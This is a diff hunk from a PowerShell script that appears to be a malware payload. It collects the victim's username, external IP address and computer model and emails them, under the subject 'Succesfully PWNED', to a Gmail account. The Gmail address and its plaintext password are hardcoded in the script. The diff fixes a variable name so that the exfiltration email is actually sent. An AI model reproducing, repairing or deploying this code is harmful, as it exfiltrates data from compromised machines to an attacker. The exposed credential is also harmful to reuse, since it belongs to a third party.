@@ -14,8 +14,8 @@ $ReportEmail = new-object Net.Mail.MailMessage
 $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("beneafrr@gmail.com", "Milo36912!");
 $smtp.EnableSsl = $true
-$Message.From = "beneafrr@gmail.com"
-$Message.To.Add("beneafrr@gmail.com")
+$ReportEmail.From = "beneafrr@gmail.com"
+$ReportEmail.To.Add("beneafrr@gmail.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
